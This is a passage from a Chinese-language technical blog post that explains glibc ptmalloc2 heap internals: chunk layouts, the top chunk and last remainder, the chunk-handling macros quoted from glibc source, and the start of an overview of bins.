的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p>一个已经分配的 chunk 的样子如下。<strong>我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</strong></p><p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p><p>已经被分配使用的 <em>chunk</em> 结构如下两个图：（图一图二 size 位 A 与 N 相同含义只是表示不同）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">chunk-&gt;</span><span class="bash"> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line"><span class="meta">  mem-&gt;</span><span class="bash"> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line"><span class="meta">chunk-&gt;</span><span class="bash"> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p><img src="img%5Callocated-chunk.png" alt="allocated chunk"></p><h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free_chunk"></a>free_chunk</h4><p>被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">chunk-&gt;</span><span class="bash"> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line"><span class="meta">  mem-&gt;</span><span class="bash"> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line"><span class="meta">chunk-&gt;</span><span class="bash"> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小</p><ol><li>本身的 size 字段会记录。（图中最后一行 size 位）</li><li>它后面的 chunk 会记录。（图中倒数第二行 nextchunk 的 prevsize 位） </li></ol><p><strong>一般情况下</strong>（fastbin中存在特例），物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p><p><strong>！！！一些关于堆的约束，后面详细考虑！！！</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    The three exceptions to all this are:</span></span><br><span class="line"><span class="comment">     1. The special chunk `top&#x27; doesn&#x27;t bother using the</span></span><br><span class="line"><span class="comment">    trailing size field since there is no next contiguous chunk</span></span><br><span class="line"><span class="comment">    that would have to index off it. After initialization, `top&#x27;</span></span><br><span class="line"><span class="comment">    is forced to always exist.  If it would become less than</span></span><br><span class="line"><span class="comment">    MINSIZE bytes long, it is replenished.</span></span><br><span class="line"><span class="comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span></span><br><span class="line"><span class="comment">    bit M (IS_MMAPPED) set in their size fields.  Because they are</span></span><br><span class="line"><span class="comment">    allocated one-by-one, each must contain its own trailing size</span></span><br><span class="line"><span class="comment">    field.  If the M bit is set, the other bits are ignored</span></span><br><span class="line"><span class="comment">    (because mmapped chunks are neither in an arena, nor adjacent</span></span><br><span class="line"><span class="comment">    to a freed chunk).  The M bit is also used for chunks which</span></span><br><span class="line"><span class="comment">    originally came from a dumped heap via malloc_set_state in</span></span><br><span class="line"><span class="comment">    hooks.c.</span></span><br><span class="line"><span class="comment">     3. Chunks in fastbins are treated as allocated chunks from the</span></span><br><span class="line"><span class="comment">    point of view of the chunk allocator.  They are consolidated</span></span><br><span class="line"><span class="comment">    with their neighbors only in bulk, in malloc_consolidate.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>glibc 中对于 top chunk 的描述如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The top-most available chunk (i.e., the one bordering the end of</span></span><br><span class="line"><span class="comment">    available memory) is treated specially. It is never included in</span></span><br><span class="line"><span class="comment">    any bin, is used only if no other chunk is available, and is</span></span><br><span class="line"><span class="comment">    released back to the system if it is very large (see</span></span><br><span class="line"><span class="comment">    M_TRIM_THRESHOLD).  Because top initially</span></span><br><span class="line"><span class="comment">    points to its own bin with initial zero size, thus forcing</span></span><br><span class="line"><span class="comment">    extension on the first malloc request, we avoid having any special</span></span><br><span class="line"><span class="comment">    code in malloc to check whether it even exists yet. But we still</span></span><br><span class="line"><span class="comment">    need to do so when getting memory from system, so we make</span></span><br><span class="line"><span class="comment">    initial_top treat the bin as a legal but unusable chunk during the</span></span><br><span class="line"><span class="comment">    interval between initialization and the first call to</span></span><br><span class="line"><span class="comment">    sysmalloc. (This is somewhat delicate, since it relies on</span></span><br><span class="line"><span class="comment">    the 2 preceding words to be zero during this interval as well.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> initial_top(M) (unsorted_chunks(M))</span></span><br></pre></td></tr></table></figure><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk。<strong>top chunk 不属于任何一个 bin</strong>，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果 <em>top chunk</em> 大小不小于用户请求的大小，就将该 <em>top chunk</em> 分作两部分：用户请求的 <em>chunk</em> 和 剩余的部分（成为新的 <em>top chunk</em>）。否则，就对 heap 进行扩展后再进行分配。在 <em>main arena</em> 中通过 <code>sbrk</code> 扩展 <em>heap</em>，而在<em>thread arena</em> 中通过 <code>mmap</code> 分配新的 <em>heap</em>。</p><p>需要注意的是，top chunk 的 prev_inuse 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p><p><strong>初始情况下，我们可以将 unsorted chunk 作为 top chunk。</strong></p><h4 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h4><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk （bin中的chunk）可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last remainder chunk ，unsort bin 也会存这一块。top chunk 分割剩下的部分不会作为 last remainder。</p><h4 id="chunk-相关宏"><a href="#chunk-相关宏" class="headerlink" title="chunk 相关宏"></a>chunk 相关宏</h4><p>这里主要介绍 chunk 的大小、对齐检查以及一些转换的宏。</p><p><strong>chunk 与 mem 指针头部的转换</strong></p><p>mem 指向用户得到的内存的起始位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))</span></span><br></pre></td></tr></table></figure><p><strong>最小的 chunk 大小</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure><p>这里，offsetof 函数计算出 fd_nextsize 在 malloc_chunk 中的偏移，说明最小的 chunk 至少要包含 bk 指针。</p><p><strong>最小申请的堆内存大小</strong></p><p>用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍。</p><p><strong>注：就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的，个人认为之所以要添加两个宏是为了方便以后修改 malloc_chunk 时方便一些。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE                                                                \</span></span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span><br><span class="line">                      ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure><p><strong>检查分配给用户的内存是否对齐</strong></p><p>2 * SIZE_SZ 大小对齐。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"><span class="comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p)                                                    \</span></span><br><span class="line">    ((<span class="keyword">uintptr_t</span>)(MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="line">     MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p><strong>请求字节数判断</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T)(<span class="number">-2</span> * MINSIZE))</span><br></pre></td></tr></table></figure><p><strong>将用户请求内存大小转为实际分配内存大小</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="line">        __set_errno(ENOMEM);                                                   \</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                                                              \</span><br><span class="line">    &#125;                                                                          \</span><br><span class="line">    (sz) = request2size(req);</span><br></pre></td></tr></table></figure><p>当一个 chunk 处于已分配状态时，它的物理相邻的下一个 chunk 的 prev_size 字段必然是无效的，故而这个字段就可以被当前这个 chunk 使用。这就是 ptmalloc 中 chunk 间的复用。具体流程如下</p><ol><li>首先，利用 REQUEST_OUT_OF_RANGE 判断是否可以分配用户请求的字节大小的 chunk。</li><li>其次，需要注意的是用户请求的字节是用来存储数据的，即 chunk header 后面的部分。与此同时，由于 chunk 间复用，所以可以使用下一个 chunk 的 prev_size 字段。因此，这里只需要再添加 SIZE_SZ 大小即可以完全存储内容。</li><li>由于系统中所允许的申请的 chunk 最小是 MINSIZE，所以与其进行比较。如果不满足最低要求，那么就需要直接分配 MINSIZE 字节。</li><li>如果大于的话，因为系统中申请的 chunk 需要 2 * SIZE_SZ 对齐，所以这里需要加上 MALLOC_ALIGN_MASK 以便于对齐。</li></ol><p><strong>个人认为，这里在 request2size 的宏的第一行中没有必要加上 MALLOC_ALIGN_MASK。</strong></p><p><strong>需要注意的是，通过这样的计算公式得到的 size 最终一定是满足用户需要的。</strong></p><p><strong>标记位相关</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark a chunk as not being on the main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">   macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">   cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">   people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure><p><strong>获取 chunk size</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p><strong>获取下一个物理相邻的 chunk</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure><p><strong>获取前一个 chunk 的信息</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure><p><strong>当前 chunk 使用状态相关操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)                                                               \</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse(p)                                                           \</span></span><br><span class="line">    ((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size |= PREV_INUSE</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse(p)                                                         \</span></span><br><span class="line">    ((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br></pre></td></tr></table></figure><p><strong>设置 chunk 的 size 字段</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="comment">// SIZE_BITS = 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head_size(p, s)                                                    \</span></span><br><span class="line">    ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head(p, s) ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_foot(p, s)                                                         \</span></span><br><span class="line">    (((mchunkptr)((<span class="keyword">char</span> *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br></pre></td></tr></table></figure><p><strong>获取指定偏移的 chunk</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><p><strong>指定偏移处 chunk 使用状态相关操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)                                              \</span></span><br><span class="line">    (((mchunkptr)(((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                                          \</span></span><br><span class="line">    (((mchunkptr)(((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                                        \</span></span><br><span class="line">    (((mchunkptr)(((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br></pre></td></tr></table></figure><h3 id="bin-介绍"><a href="#bin-介绍" class="headerlink" title="bin 介绍"></a>bin 介绍</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>我们曾经说过，用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p><p>在具体的实现中，ptmalloc 采用分箱式方法对空闲的 chunk 进行管理。首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：fast bins，small bins，large bins，unsorted bin。每类中仍然有更细的划分，相似大小的 chunk 会用双（单）向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk 。</p><p>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure><p>一个 bin 相当于一个 chunk 链表，我们把每个链表的头节点 chunk 作为 bins 数组，但是由于这个头节点作为 bin 表头，其 prev_size 与 size 字段是没有任何实际作用的，因此我们在存储头节点 chunk 的时候仅仅只需要存储头节点 chunk 的 fd 和 bk 即可，而其中的 prev_size 与 size 字段被重用为另一个 bin 的头节点的 fd 与 bk，这样可以节省空间，并提高可用性。因此<strong>我们仅仅只需要 mchunkptr 类型的指针数组就足够存储这些头节点</strong>，那 prev_size 与 size 字段到底是怎么重用的呢？这里我们以 32 位系统为例</p><table><thead><tr><th align="left">含义</th><th align="left">bin1 的 fd/bin2 的 prev_size</th><th align="left">bin1 的 bk/bin2 的 size</th><th align="left">bin2 的 fd/bin3 的 prev_size</th><th align="left">bin2 的 bk/bin3 的 size</th></tr></thead><tbody><tr><td align="left">bin 下标</td><td align="left">0</td><td align="left">1</td><td align="left">2</td><td align="left">3</td></tr></tbody></table><p>可以看出除了第一个 bin（unsorted 